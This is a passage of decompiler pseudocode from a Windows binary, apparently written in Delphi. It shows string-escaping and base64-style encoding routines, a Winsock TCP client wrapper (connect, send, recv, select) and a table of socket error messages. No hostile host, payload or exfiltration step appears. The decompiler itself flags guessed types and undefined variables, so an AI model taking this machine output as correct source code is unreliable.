      if ( *(_BYTE *)(v20 + v4 - 1) > 0x7Fu )
      {
        sub_403670(&v13);
        sub_40372C(&v15, (__int32)v13);
      }
      ++v4;
      --v3;
    }
    while ( v3 );
  }
  v16 = 128;
  for ( i = 0; i != 20; ++i )
  {
    v6 = (unsigned __int8)i < 0x1Fu;
    if ( (unsigned __int8)i <= 0x1Fu )
      v6 = _bittest(&v18, i & 0x7F);
    if ( v6 )
    {
      sub_40EDA4((int)v15, v19, i, &v14);
      v7 = 0;
      v8 = sub_403724((int)v14);
      if ( v8 > 0 )
      {
        v9 = 1;
        do
        {
          if ( v14[v9 - 1] == 95 )
            ++v7;
          ++v9;
          --v8;
        }
        while ( v8 );
      }
      if ( v7 < v16 )
      {
        v16 = v7;
        v17 = i;
        if ( !v7 )
          break;
      }
    }
  }
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_40F33B;
  sub_4034EC((int)&v13, 3);
  sub_4034C8(&v20);
  return v17;
}

//----- (0040F348) --------------------------------------------------------
int sub_40F348()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40F36D;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E650;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E650: using guessed type int dword_41E650;

//----- (0040F378) --------------------------------------------------------
void sub_40F378()
{
  --dword_41E650;
}
// 41E650: using guessed type int dword_41E650;

//----- (0040F3B4) --------------------------------------------------------
int __usercall sub_40F3B4@<eax>(int a1@<eax>, char **a2@<edx>)
{
  int v3; // ebx
  int v4; // edi
  unsigned int v6[2]; // [esp-Ch] [ebp-44h] BYREF
  int *v7; // [esp-4h] [ebp-3Ch]
  char *v8; // [esp+Ch] [ebp-2Ch] BYREF
  signed __int32 v9[8]; // [esp+10h] [ebp-28h] BYREF
  char *v10; // [esp+30h] [ebp-8h] BYREF
  int v11; // [esp+34h] [ebp-4h]
  int savedregs; // [esp+38h] [ebp+0h] BYREF

  v8 = 0;
  v10 = 0;
  v11 = a1;
  sub_4038D8(a1);
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_40F48F;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_4034C8(a2);
  v3 = sub_403724(v11);
  if ( v3 > 0 )
  {
    v4 = 1;
    do
    {
      sub_403670(&v10);
      qmemcpy(v9, &unk_41D700, sizeof(v9));
      sub_402A44(v9, (char *)dword_40F4A0, 32);
      if ( _bittest(v9, (unsigned __int8)*v10) )
      {
        sub_40701C((unsigned __int8)*v10, 2, &v8);
        sub_403770((volatile __int32 *)&v10, (char *)&dword_40F4C8, v8);
      }
      sub_40372C(a2, (__int32)v10);
      ++v4;
      --v3;
    }
    while ( v3 );
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_40F496;
  sub_4034C8(&v8);
  return sub_4034EC((int)&v10, 2);
}
// 40F4A0: using guessed type int dword_40F4A0[4];
// 40F4C8: using guessed type int dword_40F4C8;

//----- (0040F4CC) --------------------------------------------------------
_DWORD *__usercall sub_40F4CC@<eax>(int a1@<eax>, char **a2@<edx>)
{
  char v3; // al
  int v4; // eax
  char v5; // al
  int v6; // eax
  char v7; // al
  int v8; // esi
  char *v9; // ebx
  int v10; // eax
  unsigned int v12[2]; // [esp-Ch] [ebp-28h] BYREF
  int *v13; // [esp-4h] [ebp-20h]
  char *v14; // [esp+Ch] [ebp-10h] BYREF
  char v15; // [esp+10h] [ebp-Ch] BYREF
  char v16; // [esp+11h] [ebp-Bh]
  char v17; // [esp+12h] [ebp-Ah]
  char v18; // [esp+13h] [ebp-9h]
  int v19; // [esp+14h] [ebp-8h]
  int v20; // [esp+18h] [ebp-4h] BYREF
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v14 = 0;
  v20 = a1;
  sub_4038D8(a1);
  v13 = &savedregs;
  v12[1] = (unsigned int)&loc_40F5FA;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  sub_4034C8(a2);
  v19 = 1;
  while ( 1 )
  {
    v10 = sub_403724(v20);
    if ( v10 < v19 )
      break;
    v3 = *(_BYTE *)(v20 + v19++ - 1);
    v15 = (unsigned __int8)(v3 & 0xFC) >> 2;
    v16 = 16 * (v3 & 3);
    v4 = sub_403724(v20);
    if ( v4 < v19 )
    {
      v17 = 64;
      v18 = 64;
    }
    else
    {
      v5 = *(_BYTE *)(v20 + v19++ - 1);
      v16 += (unsigned __int8)(v5 & 0xF0) >> 4;
      v17 = 4 * (v5 & 0xF);
      v6 = sub_403724(v20);
      if ( v6 < v19 )
      {
        v18 = 64;
      }
      else
      {
        v7 = *(_BYTE *)(v20 + v19++ - 1);
        v17 += (unsigned __int8)(v7 & 0xC0) >> 6;
        v18 = v7 & 0x3F;
      }
    }
    v8 = 4;
    v9 = &v15;
    do
    {
      sub_403670(&v14);
      sub_40372C(a2, (__int32)v14);
      ++v9;
      --v8;
    }
    while ( v8 );
  }
  __writefsdword(0, v12[0]);
  v13 = (int *)&loc_40F601;
  sub_4034C8(&v14);
  return sub_4034C8(&v20);
}

//----- (0040F654) --------------------------------------------------------
int sub_40F654()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40F679;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E654;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E654: using guessed type int dword_41E654;

//----- (0040F684) --------------------------------------------------------
void sub_40F684()
{
  --dword_41E654;
}
// 41E654: using guessed type int dword_41E654;

//----- (0040F6B4) --------------------------------------------------------
int __usercall sub_40F6B4@<eax>(int result@<eax>, int *a2@<edx>)
{
  if ( *a2 < 64 )
    a2[++*a2] = result;
  return result;
}

//----- (0040F6C4) --------------------------------------------------------
_DWORD *__usercall sub_40F6C4@<eax>(_DWORD *result@<eax>)
{
  *result = 0;
  return result;
}

//----- (0040F754) --------------------------------------------------------
int sub_40F754()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40F779;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E658;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E658: using guessed type int dword_41E658;

//----- (0040F784) --------------------------------------------------------
void sub_40F784()
{
  --dword_41E658;
}
// 41E658: using guessed type int dword_41E658;

//----- (0040F908) --------------------------------------------------------
_DWORD *__usercall sub_40F908@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  _DWORD *v3; // esi
  int v4; // eax

  if ( a2 )
    a1 = (_DWORD *)sub_402CDC((int)a1, a2);
  v2 = a2;
  v3 = a1;
  sub_402BAC(a1, 0);
  *((_BYTE *)v3 + 52) = 0;
  v3[1] = -1;
  v3[11] = 0;
  v4 = WSAStartup(0x101u, (LPWSADATA)(v3 + 14));
  sub_40FF88((int)v3, v4);
  sub_40FF9C((int)v3);
  if ( v2 )
    sub_402D34(v3);
  return v3;
}
// 40F916: variable 'a2' is possibly undefined

//----- (0040F96C) --------------------------------------------------------
_DWORD *__usercall sub_40F96C@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  _DWORD *result; // eax

  v2 = sub_402D3C(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_40FAC8((int)v2);
  result = sub_402BCC(v5, v4 & 0xFC);
  if ( v4 > 0 )
    return (_DWORD *)sub_402D2C(v5);
  return result;
}
// 40F973: variable 'v3' is possibly undefined

//----- (0040F998) --------------------------------------------------------
_DWORD *__userpurge sub_40F998@<eax>(int a1@<eax>, int a2@<edx>, char *a3@<ecx>, char *a4)
{
  char *v6; // ecx
  struct protoent *v7; // esi
  struct servent *v8; // eax
  char *v9; // eax
  u_short v10; // ax
  char v11; // zf
  char *v12; // edi
  unsigned int v13; // eax
  struct hostent *v14; // eax
  const char *p_name; // [esp-10h] [ebp-20h]
  unsigned int v17[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v18; // [esp-4h] [ebp-14h]
  char *v19; // [esp+Ch] [ebp-4h] BYREF
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v19 = a3;
  sub_4038D8((int)a3);
  sub_4038D8((int)a4);
  v18 = &savedregs;
  v17[1] = (unsigned int)&loc_40FA7D;
  v17[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v17);
  sub_4028D4((char *)a2, 16, 0);
  *(_WORD *)a2 = 2;
  v7 = getprotobynumber(*(_DWORD *)(a1 + 44));
  v8 = 0;
  if ( v7 )
  {
    p_name = v7->p_name;
    v9 = sub_4038E8(a4);
    v8 = getservbyname(v9, p_name);
  }
  if ( v8 )
  {
    *(_WORD *)(a2 + 2) = v8->s_port;
  }
  else
  {
    v10 = sub_407058((int)a4, 0, v6);
    *(_WORD *)(a2 + 2) = htons(v10);
  }
  sub_403834((int)v19, (int *)"255.255.255.255");
  if ( v11 )
  {
    *(_DWORD *)(a2 + 4) = -1;
  }
  else
  {
    v12 = sub_4038E8(v19);
    v13 = inet_addr(v12);
    *(_DWORD *)(a2 + 4) = v13;
    if ( v13 == -1 )
    {
      v14 = gethostbyname(v12);
      if ( v14 )
        *(_DWORD *)(a2 + 4) = **(_DWORD **)v14->h_addr_list;
    }
  }
  __writefsdword(0, v17[0]);
  v18 = (int *)&loc_40FA84;
  sub_4034C8(&v19);
  return sub_4034C8(&a4);
}
// 40FA02: variable 'v6' is possibly undefined
// 40FA28: variable 'v11' is possibly undefined

//----- (0040FAA4) --------------------------------------------------------
_DWORD *__usercall sub_40FAA4@<eax>(int a1@<eax>)
{
  if ( *(_DWORD *)(a1 + 4) == -1 )
    *(_DWORD *)(a1 + 40) = WSAGetLastError();
  else
    *(_DWORD *)(a1 + 40) = 0;
  return sub_40FF9C(a1);
}

//----- (0040FAC8) --------------------------------------------------------
int __usercall sub_40FAC8@<eax>(int a1@<eax>)
{
  return closesocket(*(_DWORD *)(a1 + 4));
}

//----- (0040FAD4) --------------------------------------------------------
int __usercall sub_40FAD4@<eax>(int a1@<eax>, char *a2@<edx>, char *a3@<ecx>)
{
  int v4; // eax
  unsigned int v6[2]; // [esp-Ch] [ebp-28h] BYREF
  int *v7; // [esp-4h] [ebp-20h]
  struct sockaddr name; // [esp+4h] [ebp-18h] BYREF
  char *v9; // [esp+14h] [ebp-8h] BYREF
  char *v10; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v9 = a3;
  v10 = a2;
  sub_4038D8((int)a2);
  sub_4038D8((int)v9);
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_40FB53;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_40F998(a1, (int)&name, v10, v9);
  v4 = connect(*(_DWORD *)(a1 + 4), &name, 16);
  sub_40FF88(a1, v4);
  sub_40FB60(a1);
  sub_40FF9C(a1);
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_40FB5A;
  return sub_4034EC((int)&v9, 2);
}

//----- (0040FB60) --------------------------------------------------------
int __usercall sub_40FB60@<eax>(int a1@<eax>)
{
  int v3[2]; // [esp+0h] [ebp-8h] BYREF

  v3[0] = 16;
  getsockname(*(_DWORD *)(a1 + 4), (struct sockaddr *)(a1 + 8), v3);
  v3[0] = 16;
  return getpeername(*(_DWORD *)(a1 + 4), (struct sockaddr *)(a1 + 24), v3);
}

//----- (0040FB94) --------------------------------------------------------
int __usercall sub_40FB94@<eax>(int len@<ecx>, char *buf@<edx>, int a3@<eax>)
{
  int v4; // esi

  v4 = send(*(_DWORD *)(a3 + 4), buf, len, 0);
  sub_40FF88(a3, v4);
  sub_40FF9C(a3);
  return v4;
}

//----- (0040FBBC) --------------------------------------------------------
_DWORD *__usercall sub_40FBBC@<eax>(int a1@<eax>, char a2@<dl>)
{
  int v3; // eax
  char buf[8]; // [esp+0h] [ebp-8h] BYREF

  buf[0] = a2;
  v3 = send(*(_DWORD *)(a1 + 4), buf, 1, 0);
  sub_40FF88(a1, v3);
  return sub_40FF9C(a1);
}
// 40FBBC: using guessed type char buf[8];

//----- (0040FBE8) --------------------------------------------------------
_DWORD *__usercall sub_40FBE8@<eax>(int a1@<eax>, char *a2@<edx>)
{
  char *v3; // eax
  int v4; // eax
  int v6; // [esp-14h] [ebp-1Ch]
  unsigned int v7[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v8; // [esp-4h] [ebp-Ch]
  char *v9; // [esp+4h] [ebp-4h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v9 = a2;
  sub_4038D8((int)a2);
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_40FC4B;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v6 = sub_403724((int)v9);
  v3 = sub_4038E8(v9);
  v4 = send(*(_DWORD *)(a1 + 4), v3, v6, 0);
  sub_40FF88(a1, v4);
  sub_40FF9C(a1);
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_40FC52;
  return sub_4034C8(&v9);
}

//----- (0040FC58) --------------------------------------------------------
int __usercall sub_40FC58@<eax>(int len@<ecx>, char *buf@<edx>, int a3@<eax>)
{
  int v4; // eax
  int v5; // esi

  v4 = recv(*(_DWORD *)(a3 + 4), buf, len, 0);
  v5 = v4;
  if ( v4 )
    sub_40FF88(a3, v4);
  else
    *(_DWORD *)(a3 + 40) = 10057;
  sub_40FF9C(a3);
  return v5;
}

//----- (0040FC90) --------------------------------------------------------
int __usercall sub_40FC90@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v4; // ebx
  int v5; // eax
  int buf[4]; // [esp+0h] [ebp-10h] BYREF

  buf[0] = a3;
  LOBYTE(buf[0]) = 0;
  v4 = 0;
  if ( (unsigned __int8)sub_410100(a1, a2) )
  {
    v5 = recv(*(_DWORD *)(a1 + 4), (char *)buf, 1, 0);
    if ( v5 )
      sub_40FF88(a1, v5);
    else
      *(_DWORD *)(a1 + 40) = 10057;
    LOBYTE(v4) = buf[0];
  }
  else
  {
    *(_DWORD *)(a1 + 40) = 10060;
  }
  sub_40FF9C(a1);
  return v4;
}
// 40FC90: using guessed type int buf[4];

//----- (0040FCF0) --------------------------------------------------------
_DWORD *__usercall sub_40FCF0@<eax>(char **a1@<eax>, int a2@<edx>, volatile __int32 *a3@<ecx>)
{
  u_long v4; // ecx
  int v5; // esi
  int v6; // ebx
  _BYTE *v7; // esi
  char v8; // bl
  _BYTE *v9; // eax
  unsigned int v11[2]; // [esp-Ch] [ebp-438h] BYREF
  int *v12; // [esp-4h] [ebp-430h]
  __int32 v13; // [esp+Ch] [ebp-420h] BYREF
  char *v14; // [esp+10h] [ebp-41Ch] BYREF
  char *v15; // [esp+14h] [ebp-418h] BYREF
  char v16[1025]; // [esp+1Bh] [ebp-411h] BYREF
  char *buf; // [esp+41Ch] [ebp-10h]
  char *v18; // [esp+420h] [ebp-Ch] BYREF
  volatile __int32 *v19; // [esp+424h] [ebp-8h]
  int v20; // [esp+428h] [ebp-4h]
  int savedregs; // [esp+42Ch] [ebp+0h] BYREF

  v13 = 0;
  v14 = 0;
  v15 = 0;
  v18 = 0;
  v19 = a3;
  v20 = a2;
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_40FEDB;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  sub_4034C8(&v18);
  buf = v16;
  a1[10] = 0;
  while ( a1[12] )
  {
LABEL_14:
    v7 = sub_4039B4(dword_40FEF4, a1[12]);
    if ( (int)v7 <= 0 )
      v7 = (_BYTE *)sub_403724((int)a1[12]);
    sub_40392C((int)a1[12], 1, (int)(v7 - 1), &v15);
    sub_40372C(&v18, (__int32)v15);
    v8 = v7[(_DWORD)a1[12] - 1];
    sub_40396C(a1 + 12, 1, (int)v7);
    sub_403670(&v14);
    sub_40372C(&v18, (__int32)v14);
    if ( v8 == 10 )
      goto LABEL_17;
  }
  v5 = sub_41005C((int)a1, v4);
  if ( !v5 )
    v5 = 1;
  if ( v5 > 1024 )
    v5 = 1024;
  if ( v5 == 1 )
  {
    (*((void (**)(void))*a1 + 5))();
    if ( a1[10] )
      goto LABEL_17;
    sub_403670(a1 + 12);
    goto LABEL_14;
  }
  v6 = recv((SOCKET)a1[1], buf, v5, 0);
  sub_40FF88((int)a1, v6);
  if ( !v6 )
    a1[10] = (char *)10057;
  if ( !a1[10] )
  {
    v16[v6] = 0;
    sub_403680(a1 + 12, buf);
    goto LABEL_14;
  }
LABEL_17:
  if ( a1[10] )
  {
    sub_4034C8(v19);
  }
  else
  {
    sub_406F20((unsigned __int8 *)v18, &v13);
    sub_403560((volatile __int32 *)&v18, v13);
    v9 = sub_4039B4(&dword_40FF00, v18);
    if ( (int)v9 > 0 )
      sub_40392C((int)v18, 1, (int)(v9 - 1), &v18);
    sub_40351C(v19, (__int32)v18);
  }
  sub_40FF9C((int)a1);
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_40FEE2;
  sub_4034EC((int)&v13, 3);
  return sub_4034C8(&v18);
}
// 40FD4D: variable 'v4' is possibly undefined
// 40FEF4: using guessed type int dword_40FEF4[3];
// 40FF00: using guessed type int dword_40FF00;
// 40FCF0: using guessed type char var_411[1025];

//----- (0040FF04) --------------------------------------------------------
int __usercall sub_40FF04@<eax>(int len@<ecx>, char *buf@<edx>, int a3@<eax>)
{
  int v4; // esi

  v4 = recv(*(_DWORD *)(a3 + 4), buf, len, 2);
  sub_40FF88(a3, v4);
  sub_40FF9C(a3);
  return v4;
}

//----- (0040FF2C) --------------------------------------------------------
int __usercall sub_40FF2C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v4; // ebx
  int v5; // eax
  int buf[4]; // [esp+0h] [ebp-10h] BYREF

  buf[0] = a3;
  LOBYTE(buf[0]) = 0;
  v4 = 0;
  if ( (unsigned __int8)sub_410100(a1, a2) )
  {
    v5 = recv(*(_DWORD *)(a1 + 4), (char *)buf, 1, 2);
    if ( !v5 )
      *(_DWORD *)(a1 + 40) = 10057;
    sub_40FF88(a1, v5);
    LOBYTE(v4) = buf[0];
  }
  else
  {
    *(_DWORD *)(a1 + 40) = 10060;
  }
  sub_40FF9C(a1);
  return v4;
}
// 40FF2C: using guessed type int buf[4];

//----- (0040FF88) --------------------------------------------------------
int __usercall sub_40FF88@<eax>(int a1@<eax>, int a2@<edx>)
{
  int result; // eax

  if ( a2 == -1 )
    result = WSAGetLastError();
  else
    result = 0;
  *(_DWORD *)(a1 + 40) = result;
  return result;
}

//----- (0040FF9C) --------------------------------------------------------
_DWORD *__usercall sub_40FF9C@<eax>(int a1@<eax>)
{
  int v2; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-28h] BYREF
  DWORD v5; // [esp-8h] [ebp-24h]
  int *v6; // [esp-4h] [ebp-20h]
  const ULONG_PTR *v7; // [esp+0h] [ebp-1Ch]
  unsigned int v8; // [esp+4h] [ebp-18h]
  int v9; // [esp+8h] [ebp-14h] BYREF
  void *v10; // [esp+Ch] [ebp-10h]
  int v11; // [esp+10h] [ebp-Ch]
  char v12; // [esp+14h] [ebp-8h]
  __int32 v13; // [esp+18h] [ebp-4h] BYREF
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v13 = 0;
  v6 = &savedregs;
  v5 = (DWORD)&loc_41002B;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( *(_BYTE *)(a1 + 52) && *(_DWORD *)(a1 + 40) )
  {
    sub_4101AC(*(_DWORD *)(a1 + 40), &v13);
    v9 = *(_DWORD *)(a1 + 40);
    LOBYTE(v10) = 0;
    v11 = v13;
    v12 = 11;
    v2 = sub_40948C((int)dword_40F7D8, 1, "TCP/IP socket error %d: %s", 1, (int)&v9);
    *(_DWORD *)(v2 + 12) = *(_DWORD *)(a1 + 40);
    sub_40351C((volatile __int32 *)(v2 + 16), v13);
    sub_402F98((DWORD)ExceptionList, v5, (DWORD)v6, v7);
  }
  __writefsdword(0, v8);
  v10 = &loc_410032;
  return sub_4034C8(&v13);
}
// 40F7D8: using guessed type int dword_40F7D8[2];

//----- (0041005C) --------------------------------------------------------
u_long __usercall sub_41005C@<eax>(int a1@<eax>, u_long a2@<ecx>)
{
  u_long v3; // [esp+0h] [ebp-4h] BYREF

  v3 = a2;
  ioctlsocket(*(_DWORD *)(a1 + 4), 1074030207, &v3);
  return v3;
}

//----- (00410074) --------------------------------------------------------
int __fastcall sub_410074(int a1, char **a2)
{
  struct hostent *v3; // ebx
  int result; // eax
  unsigned int v5[5]; // [esp-Ch] [ebp-114h] BYREF
  char name[256]; // [esp+8h] [ebp-100h] BYREF
  int savedregs; // [esp+108h] [ebp+0h] BYREF

  v5[2] = (unsigned int)&savedregs;
  v5[1] = (unsigned int)&loc_4100DF;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_4034C8(a2);
  gethostname(name, 255);
  if ( name )
  {
    v3 = gethostbyname(name);
    if ( v3 )
      sub_403680(a2, v3->h_name);
  }
  if ( !*a2 )
    sub_40351C((volatile __int32 *)a2, (__int32)"127.0.0.1");
  result = 0;
  __writefsdword(0, v5[0]);
  return result;
}

//----- (00410100) --------------------------------------------------------
int __usercall sub_410100@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v3; // ebx
  const struct timeval *v4; // esi
  int v5; // esi
  int v7[2]; // [esp+0h] [ebp-118h] BYREF
  fd_set readfds; // [esp+8h] [ebp-110h] BYREF

  v7[1] = 1000 * (a2 % 1000);
  v3 = 1000;
  v7[0] = a2 / 1000;
  v4 = (const struct timeval *)v7;
  if ( a2 == -1 )
    v4 = 0;
  sub_40F6C4(&readfds);
  sub_40F6B4(*(_DWORD *)(a1 + 4), (int *)&readfds);
  v5 = select(0, &readfds, 0, 0, v4);
  sub_40FF88(a1, v5);
  if ( *(_DWORD *)(a1 + 40) )
    v5 = 0;
  LOBYTE(v3) = v5 > 0;
  sub_40FF9C(a1);
  return v3;
}

//----- (00410188) --------------------------------------------------------
_DWORD *__usercall sub_410188@<eax>(int a1@<eax>)
{
  *(_DWORD *)(a1 + 4) = socket(2, 1, 6);
  *(_DWORD *)(a1 + 44) = 6;
  return sub_40FAA4(a1);
}

//----- (004101AC) --------------------------------------------------------
_DWORD *__usercall sub_4101AC@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>)
{
  bool v4; // cf
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  unsigned int v11[2]; // [esp-14h] [ebp-18h] BYREF
  int *v12; // [esp-Ch] [ebp-10h]
  char *v13; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v13 = 0;
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_41074A;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  if ( a1 > 10053 )
  {
    if ( a1 > 10066 )
    {
      if ( a1 > 10092 )
      {
        if ( a1 > 11002 )
        {
          v9 = a1 - 11003;
          if ( v9 )
          {
            if ( v9 != 1 )
              goto LABEL_83;
            sub_40351C(a2, (__int32)"Valid name, no data record of requested type");
          }
          else
          {
            sub_40351C(a2, (__int32)"Non recoverable error");
          }
        }
        else if ( a1 == 11002 )
        {
          sub_40351C(a2, (__int32)"Non authoritative - host not found");
        }
        else
        {
          v8 = a1 - 10093;
          if ( v8 )
          {
            if ( v8 != 908 )
              goto LABEL_83;
            sub_40351C(a2, (__int32)"Host not found");
          }
          else
          {
            sub_40351C(a2, (__int32)"Winsock not initialized");
          }
        }
      }
      else if ( a1 == 10092 )
      {
        sub_40351C(a2, (__int32)"Winsock DLL cannot support this application");
      }
      else
      {
        switch ( a1 )
        {
          case 10067:
            sub_40351C(a2, (__int32)"Too many processes");
            break;
          case 10068:
            sub_40351C(a2, (__int32)"Too many users");
            break;
          case 10069:
            sub_40351C(a2, (__int32)"Disk quota exceeded");
            break;
          case 10070:
            sub_40351C(a2, (__int32)"Stale NFS file handle");
            break;
          case 10071:
            sub_40351C(a2, (__int32)"Too many levels of remote in path");
            break;
          case 10091:
            sub_40351C(a2, (__int32)"Network subsystem is unusable");
            break;
          default:
            goto LABEL_83;
        }
      }
    }
    else if ( a1 == 10066 )
    {
      sub_40351C(a2, (__int32)"Directory is not empty");
    }
    else
    {
      switch ( a1 )
      {
        case 10054:
          sub_40351C(a2, (__int32)"Connection reset by peer");
          break;
        case 10055:
          sub_40351C(a2, (__int32)"No buffer space available");
          break;
        case 10056:
          sub_40351C(a2, (__int32)"Socket is already connected");
          break;
        case 10057:
          sub_40351C(a2, (__int32)"Socket is not connected");
          break;
        case 10058:
          sub_40351C(a2, (__int32)"Can't send after socket shutdown");
          break;
        case 10059:
          sub_40351C(a2, (__int32)"Too many references:can't splice");
          break;
        case 10060:
          sub_40351C(a2, (__int32)"Connection timed out");
          break;
        case 10061:
          sub_40351C(a2, (__int32)"Connection refused");
          break;
        case 10062:
          sub_40351C(a2, (__int32)"Too many levels of symbolic links");
          break;
        case 10063:
          sub_40351C(a2, (__int32)"File name is too long");
          break;
        case 10064:
          sub_40351C(a2, (__int32)"Host is down");
          break;
        case 10065:
          sub_40351C(a2, (__int32)"No route to host");
          break;
        default:
          goto LABEL_83;
      }
    }
  }
  else if ( a1 == 10053 )
  {
    sub_40351C(a2, (__int32)"Software caused connection abort");
  }
  else if ( a1 > 10040 )
  {
    switch ( a1 )
    {
      case 10041:
        sub_40351C(a2, (__int32)"Protocol wrong type for socket");
        break;
      case 10042:
        sub_40351C(a2, (__int32)"Protocol not available");
        break;
      case 10043:
        sub_40351C(a2, (__int32)"Protocol not supported");
        break;
      case 10044:
        sub_40351C(a2, (__int32)"Socket not supported");
        break;
      case 10045:
        sub_40351C(a2, (__int32)"Operation not supported on socket");
        break;
      case 10046:
        sub_40351C(a2, (__int32)"Protocol family not supported");
        break;
      case 10047:
        sub_40351C(a2, (__int32)"Address family not supported");
        break;
      case 10048:
        sub_40351C(a2, (__int32)"Address already in use");
        break;
      case 10049:
        sub_40351C(a2, (__int32)"Can't assign requested address");
        break;
      case 10050:
        sub_40351C(a2, (__int32)"Network is down");
        break;
      case 10051:
        sub_40351C(a2, (__int32)"Network is unreachable");
        break;
      case 10052:
        sub_40351C(a2, (__int32)"Network dropped connection on reset");
        break;
      default:
        goto LABEL_83;
    }
  }
  else if ( a1 == 10040 )
  {
    sub_40351C(a2, (__int32)"Message too long");
  }
  else if ( a1 > 10024 )
  {
    switch ( a1 )
    {
      case 10035:
        sub_40351C(a2, (__int32)"Operation would block");
        break;
      case 10036:
        sub_40351C(a2, (__int32)"Operation now in progress");
        break;
      case 10037:
        sub_40351C(a2, (__int32)"Operation already in progress");
        break;
      case 10038:
        sub_40351C(a2, (__int32)"Socket operation on nonsocket");
        break;
      case 10039:
        sub_40351C(a2, (__int32)"Destination address required");
        break;
      default:
        goto LABEL_83;
    }
  }
  else if ( a1 == 10024 )
  {
    sub_40351C(a2, (__int32)"Too many open files");
  }
  else if ( a1 > 10013 )
  {
    v7 = a1 - 10014;
    if ( v7 )
    {
      if ( v7 != 8 )
        goto LABEL_83;
      sub_40351C(a2, (__int32)"Invalid argument");
    }
    else
    {
      sub_40351C(a2, (__int32)"Bad address");
    }
  }
  else if ( a1 == 10013 )
  {
    sub_40351C(a2, (__int32)"Permission denied");
  }
  else
  {
    v4 = a1 == 0;
    v5 = a1 - 1;
    if ( v4 )
    {
      sub_40351C(a2, (__int32)dword_410760);
    }
    else
    {
      v6 = v5 - 10003;
      if ( v6 )
      {
        if ( v6 != 5 )
        {
LABEL_83:
          sub_406FEC(a1, &v13);
          sub_4037E4(a2, 3);
          goto LABEL_84;
        }
        sub_40351C(a2, (__int32)"Bad file number");
      }
      else
      {
        sub_40351C(a2, (__int32)"Interrupted system call");
      }
    }
  }
LABEL_84:
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_410751;
  return sub_4034C8(&v13);
}
// 410760: using guessed type int dword_410760[3];

//----- (00410E58) --------------------------------------------------------
int sub_410E58()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_410E7D;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E65C;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E65C: using guessed type int dword_41E65C;

//----- (00410E88) --------------------------------------------------------
void sub_410E88()
{
  --dword_41E65C;
}
